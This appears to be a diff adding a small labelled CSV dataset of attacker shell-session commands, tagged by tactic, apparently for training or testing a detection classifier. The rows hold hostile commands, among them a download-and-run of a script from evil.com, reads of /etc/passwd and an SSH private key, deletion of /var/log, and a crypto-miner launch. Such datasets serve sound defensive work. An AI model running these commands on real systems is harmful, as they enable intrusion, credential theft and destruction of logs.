@@ -1,0 +1,7 @@
+session_commands,label
+"whoami ; uname -a ; ifconfig",reconnaissance
+"wget http://evil.com/bot.sh ; chmod +x bot.sh ; ./bot.sh",malware_delivery
+"cat /etc/passwd ; cat ~/.ssh/id_rsa",credential_access
+"history -c ; rm -rf /var/log",defense_evasion
+"ssh root@10.0.0.2",lateral_movement
+"xmrig -o pool.example.com",crypto_mining
